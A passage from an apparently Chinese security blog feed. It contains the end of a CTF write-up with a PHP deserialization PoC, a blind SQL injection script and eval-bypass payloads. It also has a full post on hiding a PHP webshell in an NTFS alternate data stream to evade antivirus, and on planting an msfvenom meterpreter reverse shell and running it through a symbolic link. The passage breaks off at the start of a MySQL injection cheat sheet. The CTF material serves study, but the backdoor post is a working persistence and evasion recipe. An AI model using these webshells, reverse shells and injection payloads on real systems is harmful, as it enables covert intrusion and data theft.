class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>poc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hint.php"</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$flag-&gt;token = <span class="string">'b706835de79a2b4e80506f582af3676a'</span>;</span><br><span class="line">$flag-&gt;token_flag = &amp;$flag-&gt;token;</span><br><span class="line"></span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line"></span><br><span class="line">$s = serialize($handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode($s);</span><br></pre></td></tr></table></figure></p><p>parse_urlÁªïËøáÊ≠£Âàô:<a href="http://lawlietweb.com/2018/05/13/parse_url/" target="_blank" rel="noopener">http://lawlietweb.com/2018/05/13/parse_url/</a><br>wake_upÁªïËøá:<a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p><h2 id="Web2-ÂÖ®ÂÆáÂÆôÊúÄÁÆÄÂçïÁöÑSQL"><a href="#Web2-ÂÖ®ÂÆáÂÆôÊúÄÁÆÄÂçïÁöÑSQL" class="headerlink" title="Web2 - ÂÖ®ÂÆáÂÆôÊúÄÁÆÄÂçïÁöÑSQL"></a>Web2 - ÂÖ®ÂÆáÂÆôÊúÄÁÆÄÂçïÁöÑSQL</h2><p>ËøáÊª§ or if sleep benchmark<br>ÂèÇËÄÉbctf-love-qÂà©Áî®pow()Âú®Êù°‰ª∂‰∏∫ÂÅáÊó∂ËøîÂõûerror</p><p><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>ËøêÁÆóÁ¨¶‰ΩúÊù°‰ª∂Âà§Êñ≠ÔºåÂ¶ÇÊûúÈîôËØØÊï∞ÊçÆÂ∫ìÊä•ÈîôÔºöÂà©Áî®powÁöÑÊ∫¢Âá∫Âà§Êñ≠limit‰ΩçÊï∞ÁöÑascii</p><p><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p><p>Âú®È¢òÁõÆ‰∏≠Ê≠£Á°ÆËøîÂõû<code>ÁôªÈôÜÂ§±Ë¥•</code>ÔºåÈîôËØØËøîÂõû<code>Êï∞ÊçÆÂ∫ìÂ§±Ë¥•</code></p><p>Exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VERSION = <span class="string">"version()"</span></span><br><span class="line">USERNAME = <span class="string">"select username from user limit 1"</span></span><br><span class="line"></span><br><span class="line">PASSWORD = <span class="string">"select (select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1)"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://cba0e34ee5d34db985195191f4c681d5c32c4b92db574826.changame.ichunqiu.com"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"1'-pow(2,1024-ascii(substr((&#123;data&#125;),&#123;pos&#125;,1))+&#123;code&#125;)-- -"</span>.format(</span><br><span class="line">                data=PASSWORD,</span><br><span class="line">                pos=i,</span><br><span class="line">                code=j</span><br><span class="line">            ),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"1"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.post(url=url, data=payload)</span><br><span class="line">            resp.encoding = <span class="string">'utf8'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Êï∞ÊçÆÂ∫ìÊìç‰ΩúÂ§±Ë¥•'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                result += chr(j)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p><p>Âà©Áî®mysqlÂà´Âêç(ÂèÇËÄÉÂçöÂÆ¢‰∏≠Mysql Injection‰∏≠# ‰∏çÁî®ÂàóÂêçÁöÑÊ≥®ÂÖ•)</p><p>Ë∑ëÂá∫password : F1AG@1s-at_/fll1llag_h3r3</p><p>ËøõÂÖ•ÂêéÂè∞‰∏∫ËøúÁ®ãÊï∞ÊçÆÂ∫ìËøûÊé•ÁïåÈù¢ÔºåÁêÜÊÉ≥Âà∞fake_mysqlServerËØªÊñá‰ª∂<br>ÂèÇËÄÉÊñáÁ´†<a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p><p>‰øÆÊîπËøô‰∏™ËÑöÊú¨ÈáåÁöÑfilelist<br><a href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></p><p>ÁÑ∂ÂêéËÆ©È¢òÁõÆÊúçÂä°Âô®ËøûÊé•Âç≥ÂèØ<br><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/F8CE6FAF-1BFD-4AFB-A159-BC74B5293451.png" alt="02c5946724036ffaa593060d7224fd1e.png"></p><h2 id="Web3-lovemath"><a href="#Web3-lovemath" class="headerlink" title="Web3 - lovemath"></a>Web3 - lovemath</h2><p>Áõ¥Êé•Â´ñÈòüÂèã@hpdogerÁöÑwp orz</p><p>ËØªÂà∞calc.phpÁöÑÊ∫êÁ†Å</p><p><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/C1913B0F-8DBC-4BD0-9583-36531EC420C2.png" alt="c0c0c8ac3e259e0335021d7fc0e1bfc5.png"><br>ÈªëÂêçÂçïËÇØÂÆöÊòØÁªï‰∏çËøáÂéªÔºåËôΩÁÑ∂Êúâ/m‰ΩÜÊòØ\rÂú®ÈªëÂêçÂçïÊâÄ‰ª•‰∏çÂ≠òÂú®Êç¢Ë°åÁªïËøá„ÄÇÊ≥®ÊÑèÁúã‰∏ãÈù¢ÁöÑwhitelist„ÄÇÊ≠£ÂàôÂåπÈÖçÂáΩÊï∞ÂêçÔºåÂè™ÂÖÅËÆ∏Eval‰ΩøÁî®ÁôΩÂêçÂçïÁöÑÂáΩÊï∞ÂÅöÂ≠óÁ¨¶‰∏≤<br><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/D83550D5-CAC5-4A66-9045-18A3FB752007.png" alt="582784a9189b198632e7d5e7a118484b.png"><br>ÊâÄ‰ª•ÊÄùË∑ØÂ∞±ÂæàÊòéÁ°ÆÔºåÊó¢ÁÑ∂ÂèÇÊï∞‰ªéÁôΩÂêçÂçïÂá∫Êù•ÂêéË¢´ÊâßË°åÔºåÈÇ£ÊºèÊ¥ûÁÇπËÇØÂÆöÂ∞±Âú®ÁôΩÂêçÂçïÁöÑÂáΩÊï∞„ÄÇ<br>Áî±‰∫éÊ≠£ÂàôÂåπÈÖçÂ≠óÊØçÁöÑËßÑÂàôÔºå‰ΩøÊàë‰ª¨‰º†ÂÖ•ÁöÑÂÆûÂèÇ‰∏çËÉΩÊòØÂ≠óÊØçÔºåÂê¶ÂàôÂ∞±‰ºöËøõÂÖ•Âà§Êñ≠Â¶Ç‰∏ã<br><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/36E22A60-B77B-47E1-867B-07D443465D5F.png" alt="e8e3debbd6230c0e0c53a3850e2b76bb.png"><br>ÊÉ≥ÂäûÊ≥ïÊääÊï∞Â≠óÂèòÊàêÂ≠óÊØçÔºåÁùÄÁúº‰∫éÂáΩÊï∞base_convertÔºåÂÆòÊñπÊèèËø∞Â¶Ç‰∏ã<br><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/BF93901B-2E8A-4809-A62C-C1D00CDC6E60.png" alt="a2935dc80f85880f2cdda71c2a7086b4.png"><br>ÂÆÉÂÖÅËÆ∏Êàë‰ª¨Â∞Ü10ËøõÂà∂Êï∞ËΩ¨Êç¢‰∏∫ÊúÄÈ´ò36ËøõÂà∂ÔºåÁªìÊûú‰∏∫Â≠óÁ¨¶‰∏≤„ÄÇÂÆåÁæéËß£ÂÜ≥‰∫ÜÊï∞Â≠ó-&gt;Â≠óÊØçÁöÑËΩ¨ÂåñÔºåÊàêÂäüÊâìÂç∞PhpinfoÂ¶Ç‰∏ã<br><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/0F5DF72A-16AC-4AC0-B59F-1D020A081AC2.png" alt="098411eef0c09290073abf8ec9ee4ab5.png"><br>Âõ†‰∏∫Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÈôêÂà∂ÔºåÊàëÊúÄÂºÄÂßãÁöÑÊÉ≥Ê≥ïÊòØËøôÊ†∑ÁöÑÔºö<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$input = hexdec(bin2hex(‚Äúsystem(‚Äòcat /flag‚Äô);‚Äù))</span><br><span class="line">$result = base_convert(10ËøõÂà∂ÁºñÁ†ÅÁöÑhex2bin,10,36).dechex($input)</span><br></pre></td></tr></table></figure></p><p>Â§±Ë¥•ÁöÑPOCÊòØËøôÊ†∑Ôºö<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</span><br></pre></td></tr></table></figure></p><p>bin2hexÂêéÁî±‰∫éËΩ¨Êç¢Âá∫Êù•ÁöÑ16ËøõÂà∂Êï∞ÂÄºËøáÂ§ßÔºåÂØºËá¥ËΩ¨Êç¢ÁöÑintÂÄºÂæàÂ§ßÊó†Ê≥ïÊ≠£Â∏∏Ë¢´dechexËøòÂéüËÄåÊ∫¢Âá∫„ÄÇ </p><p>Âç°Âú®ËøôÈáåÂæà‰πÖÔºåÊúÄÂêéÊç¢‰∫Ü‰∏ÄÁßçÂ∞èÊï∞ËøòÂéüÁöÑÊÄùË∑Ø„ÄÇ</p><p>Êàë‰ª¨Âè™ÈúÄË¶ÅÊûÑÈÄ†_GET‰∏∫16ËøõÂà∂Êï∞ÔºåËøô‰∏™16ËøõÂà∂ËΩ¨Êç¢Âá∫Êù•ÁöÑÂçÅËøõÂà∂Â∞±‰∏ç‰ºöÂæàÂ§ßÔºåËá™ÁÑ∂Âú®dechex‰πü‰∏ç‰ºöÊ∫¢Âá∫„ÄÇ</p><p>PayloadÂ¶Ç‰∏ãÔºåÊ≥®ÊÑèÁî®ÁôΩÂêçÂçïÁöÑÂÄº‰Ωú‰∏∫ÂèòÈáèÂèÇÊï∞ÔºåÂê¶ÂàôËøòÊòØ‰ºöË¢´Êã¶Êà™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;)</span><br></pre></td></tr></table></figure></p><p>ËΩ¨Êç¢ÁöÑË∞ÉÁî®Ê†àÂ¶Ç‰∏ãÔºö<br><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/9EFBD255-8430-47D2-A40A-4B63B559FECE.png" alt="669c053c37997706f12d06ce72e2e1d5.png"></p><p>Áõ¥Êé•ÂèëÂåÖÁªôÂà∞CÂèÇÊï∞ÔºåÊàêÂäügetflag</p><p><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/3C6255C6-8A8E-4A12-8CCA-0273C55AB6C5.png" alt="511c651f1848294771ccadfac4b993eb.png"></p><p>ËøòÂú®Áæ§ÈáåÁúãÂà∞‰∏Ä‰ΩçÂ∏àÂÇÖÁöÑPayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">47138</span>,<span class="number">20</span>,<span class="number">36</span>)(base_convert(<span class="number">3761671484</span>,<span class="number">13</span>,<span class="number">36</span>)(dechex(<span class="number">474260465194</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(nl f*);</span><br></pre></td></tr></table></figure><p>79‰Ωç‚Ä¶‚Ä¶ orz </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;Web1-JustSoso&quot;&gt;&lt;a href=&quot;#Web1-JustSoso&quot; class=&quot;headerlink&quot; title=&quot;Web1 - JustSoso&quot;&gt;&lt;/a&gt;Web1 - JustSoso&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;I
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ADSÈöêËóèÂêéÈó®</title>
    <link href="http://patrilic.top/2019/04/18/ADS%20%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
    <id>http://patrilic.top/2019/04/18/ADS ÈöêËóèÂêéÈó®/</id>
    <published>2019-04-18T03:20:33.000Z</published>
    <updated>2019-07-08T15:50:16.633Z</updated>
    
    <content type="html"><![CDATA[<p>È´òÈìÅ‰∏äÊ≤°‰∫ãÂπ≤ÔºåÊää‰ª•ÂâçÁöÑÁ¨îËÆ∞ÊÄªÁªì‰∏Ä‰∏ã<br>[toc]</p><h2 id="ADS"><a href="#ADS" class="headerlink" title="ADS"></a>ADS</h2><p>NTFS‰∫§Êç¢Êï∞ÊçÆÊµÅÔºàalternate data streamsÔºåÁÆÄÁß∞ADSÔºâ</p><p>ADSÊòØNTFSÁ£ÅÁõòÊ†ºÂºèÁöÑ‰∏Ä‰∏™ÁâπÊÄßÔºåÂú®NTFSÊñá‰ª∂Á≥ªÁªü‰∏ãÔºåÊØè‰∏™Êñá‰ª∂ÈÉΩÂèØ‰ª•Â≠òÂú®Â§ö‰∏™Êï∞ÊçÆÊµÅÔºåÂ∞±ÊòØËØ¥Èô§‰∫Ü‰∏ªÊñá‰ª∂ÊµÅ‰πãÂ§ñËøòÂèØ‰ª•ÊúâËÆ∏Â§öÈùû‰∏ªÊñá‰ª∂ÊµÅÂØÑÂÆøÂú®‰∏ªÊñá‰ª∂ÊµÅ‰∏≠„ÄÇÂÆÉ‰ΩøÁî®ËµÑÊ∫êÊ¥æÁîüÊù•Áª¥ÊåÅ‰∏éÊñá‰ª∂Áõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØÔºåËôΩÁÑ∂Êàë‰ª¨Êó†Ê≥ïÁúãÂà∞Êï∞ÊçÆÊµÅÊñá‰ª∂Ôºå‰ΩÜÊòØÂÆÉÂç¥ÊòØÁúüÂÆûÂ≠òÂú®‰∫éÊàë‰ª¨ÁöÑÁ≥ªÁªü‰∏≠ÁöÑ„ÄÇÂàõÂª∫‰∏Ä‰∏™Êï∞ÊçÆ‰∫§Êç¢ÊµÅÊñá‰ª∂ÁöÑÊñπÊ≥ïÂæàÁÆÄÂçïÔºåÂëΩ‰ª§‰∏∫‚ÄùÂÆø‰∏ªÊñá‰ª∂:ÂáÜÂ§á‰∏éÂÆø‰∏ªÊñá‰ª∂ÂÖ≥ËÅîÁöÑÊï∞ÊçÆÊµÅÊñá‰ª∂‚Äù„ÄÇ ‚Äî‚Äì baike.baidu.com</p><p>Êñá‰ª∂ÂëΩÂêçÔºö</p><blockquote><p>ads.txt  ÊôÆÈÄötxtÊñá‰ª∂ (‰∏ªÊñá‰ª∂)<br>ads.txt:nop.txt ÔºàÂØÑÂÆøÊñá‰ª∂Ôºâ</p></blockquote><p><img src="/ADS ÈöêËóèÂêéÈó®.resources/8C8EB255-7B79-4D1A-A316-5DE2363EBBFD.png" alt="1bb96e55543dbb1493165cec47afc7af"><br>‰ΩøÁî®<strong>dir</strong>ÂëΩ‰ª§‰∏çËÉΩÁúãÂà∞ÔºåÂøÖÈ°ª‰ΩøÁî®<strong>dir /r</strong></p><p><img src="/ADS ÈöêËóèÂêéÈó®.resources/A87A52A9-85B3-4001-B520-699A9ED67E9C.png" alt="d3973b4bd310ff1bd21deb5db2873e18"></p><h2 id="WebshellÔºàËøáDÁõæÔºâ"><a href="#WebshellÔºàËøáDÁõæÔºâ" class="headerlink" title="WebshellÔºàËøáDÁõæÔºâ"></a>WebshellÔºàËøáDÁõæÔºâ</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">phpStudy</span>\<span class="title">PHPTutorial</span>\<span class="title">WWW</span>\<span class="title">webshell</span>&gt;<span class="title">echo</span> "&lt;?<span class="title">php</span> <span class="title">phpinfo</span>();?&gt;" &gt; <span class="title">index.php:s</span>.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure><p><img src="/ADS ÈöêËóèÂêéÈó®.resources/C4AC74E5-DDB5-4C32-A202-1E55FC5FA815.png" alt="b2ed2bf9d1766135d674e36ab42aa1ac"><br><img src="/ADS ÈöêËóèÂêéÈó®.resources/762C93D1-3F06-4970-B734-B85E9F18AEC0.png" alt="f40f0ed3186d78429c5000521b823e72"></p><p>Â∞Ü Â∞èÈ©¨ÂÜôÂÖ•index.php:s.txt‰∏≠ ÔºåÁÑ∂ÂêéÂÜçindex.php‰∏≠include<br>DÁõæ‰∏çËÉΩËé∑ÂèñÈùû‰∏ªÊñá‰ª∂ÊµÅ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">    $a=&quot;696e6465782e70&quot;.&quot;68703a732e747874&quot;;</span><br><span class="line">    $b=&quot;a&quot;;</span><br><span class="line">    include(PACK(&apos;H*&apos;,$$b))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php:s.txt</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="ÊµãËØï"><a href="#ÊµãËØï" class="headerlink" title="ÊµãËØï"></a>ÊµãËØï</h2><h3 id="0x01-ÁéØÂ¢É"><a href="#0x01-ÁéØÂ¢É" class="headerlink" title="0x01 ÁéØÂ¢É"></a>0x01 ÁéØÂ¢É</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MacOS             ipaddress: <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">223</span></span><br><span class="line">Windows <span class="number">10</span>        ipaddress: <span class="number">192</span>.<span class="number">168</span>.<span class="number">121</span>.<span class="number">132</span></span><br></pre></td></tr></table></figure><h3 id="0x02-ÁîüÊàêshell"><a href="#0x02-ÁîüÊàêshell" class="headerlink" title="0x02 ÁîüÊàêshell"></a>0x02 ÁîüÊàêshell</h3><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=8888 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><h3 id="0x03-Ê§çÂÖ•ÂêéÈó®"><a href="#0x03-Ê§çÂÖ•ÂêéÈó®" class="headerlink" title="0x03 Ê§çÂÖ•ÂêéÈó®"></a>0x03 Ê§çÂÖ•ÂêéÈó®</h3><p>ÁéØÂ¢ÉÊèèËø∞ÔºöÊãøÂà∞‰∫ÜwebshellÔºåÁªèËøáÊèêÊùÉÔºåÊùÉÈôê‰∏∫Êú¨Âú∞ÁÆ°ÁêÜÂëò<br>‰∏ä‰º†‰∏Ä‰∏™ÂêéÈó®Êñá‰ª∂<br><img src="/ADS ÈöêËóèÂêéÈó®.resources/3F4E2390-E7EA-49F4-B362-DC1A776E1262.png" alt="f0f797666014d4cb4f91d9e3e1a1e0ad"></p><p>‰ΩøÁî®<strong>type</strong>Â∞Üshell.exeÊï∞ÊçÆÂÜôÂÖ•‰æùÈôÑÂú®hello.txt‰∏ä<br><img src="/ADS ÈöêËóèÂêéÈó®.resources/B3021D0D-E210-4E2E-99CD-E6BD839F0903.png" alt="99090aa172deaf9fe4ef2215b14b5e34"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink "c:\backdoor\link.exe" "c:\backdoor\hello.txt:shell.exe"</span><br></pre></td></tr></table></figure><p>server 2k3Âêé‰∏çËÉΩÁõ¥Êé•ÊâßË°åexeÔºåÂøÖÈ°ªÂª∫Á´ãÈìæÊé•<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> link.exe /b</span><br></pre></td></tr></table></figure></p><p><img src="/ADS ÈöêËóèÂêéÈó®.resources/5B9ED225-B4D9-4EFA-A8C5-8A64621A194B.png" alt="f2eae722d0632ce91a23eeeafa1d079a"></p><p>ÊàêÂäüÂõûÂºπsession</p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)</a><br><a href="https://klionsec.github.io/2017/11/13/ntfs-streams/" target="_blank" rel="noopener">https://klionsec.github.io/2017/11/13/ntfs-streams/</a><br><a href="https://blog.csdn.net/migee/article/details/56028011" target="_blank" rel="noopener">https://blog.csdn.net/migee/article/details/56028011</a><br><a href="https://blog.csdn.net/xiaoxuetu_/article/details/77318670" target="_blank" rel="noopener">https://blog.csdn.net/xiaoxuetu_/article/details/77318670</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;È´òÈìÅ‰∏äÊ≤°‰∫ãÂπ≤ÔºåÊää‰ª•ÂâçÁöÑÁ¨îËÆ∞ÊÄªÁªì‰∏Ä‰∏ã&lt;br&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ADS&quot;&gt;&lt;a href=&quot;#ADS&quot; class=&quot;headerlink&quot; title=&quot;ADS&quot;&gt;&lt;/a&gt;ADS&lt;/h2&gt;&lt;p&gt;NTFS‰∫§Êç¢Êï∞ÊçÆÊµÅÔºàalternate data streams
      
    
    </summary>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>MySQL InjectionÔºàÊåÅÁª≠Êõ¥Êñ∞Ôºâ</title>
    <link href="http://patrilic.top/2019/04/14/MySQL%20Injection/"/>
    <id>http://patrilic.top/2019/04/14/MySQL Injection/</id>
    <published>2019-04-14T15:20:33.000Z</published>
    <updated>2019-07-08T15:42:57.393Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>ÊÄªÁªì‰∏ÄÊ≥¢MySQL‰∏ãÂêÑÂºèÂêÑÊ†∑Á≠âÊ≥®ÂÖ•ÊäÄÂ∑ßÔΩû<br><strong>Test Machine Configuration</strong></p><blockquote><p>OSÔºöMacOS Mojave 10.14.2<br>MySQL: MySQL 5.7.19-log</p></blockquote><p>ÊµãËØïË°®ÁªìÊûÑÔºö<br><img src="/MySQL Injection.resources/6C53ADB2-2CA5-439F-A4B9-11C003B795A0.png" alt="3dce7ef9e83548ddeb6643a6f075af4f"></p><h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>EmmmmÔºåÊµãËØïÂ§±Ë¥•‰∫Ü<br>Áøª‰∫Ü‰∏Ä‰∫õÊñáÁ´†ÔºåÂèëÁé∞limit‰πãÂêéÁöÑanalyse() Âè™ÈÄÇÁî®‰∫é<strong>MySQL server version &lt;= 5.6.6</strong></p><p>ÈÅÇ‰ΩøÁî® Windows7 x64 + MySQL 5.5.53<br><img src="/MySQL Injection.resources/D3196ADE-0044-4C92-B294-C0F04299F77A.png" alt="26ef60fa552b1e2a9df1c06c0632111b"></p><p>ÊµãËØïËØ≠Âè•<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">LIMIT</span> &#123;$uid&#125;,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></p><p>Limit Ê≥®ÂÖ•‰∏ªË¶ÅÊòØÂõ†‰∏∫ÂêéÈù¢Êúâ‰∏Ä‰∏™ PROCEDURE analyse() Â≠òÂÇ®ËøáÁ®ã</p><p>ÊûÑÈÄ†Êä•ÈîôÊ≥®ÂÖ•<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 